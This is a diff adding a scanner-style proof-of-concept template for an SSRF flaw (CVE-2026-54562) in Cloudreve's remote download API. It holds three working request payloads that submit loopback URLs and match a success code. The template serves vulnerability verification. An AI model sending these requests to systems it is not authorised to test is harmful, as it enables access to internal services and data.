@@ -1,0 +1,73 @@
+[info]
+author = "AVE"
+description = "通过 POST /api/v4/workflow/download 提交回环地址 URL，验证 Cloudreve 未过滤内网目标导致 SSRF"
+id = "POC-AVE-2026-0576"
+name = "Cloudreve 远程下载 SSRF 漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54562",
+    "ssrf",
+    "cloudreve",
+    "remote-download",
+]
+vuln_id = [
+    "CVE-2026-54562",
+    "AVE-2026-0576",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v4/workflow/download"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"src":["http://127.0.0.1:7777/secret2"],"dst":"cloudreve://my"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"code":0']
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v4/workflow/download"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"src":["http://localhost:7777/localsecret"],"dst":"cloudreve://my"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"code":0']
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v4/workflow/download"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"src":["http://[::1]:7780/v6secret"],"dst":"cloudreve://my"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"code":0']
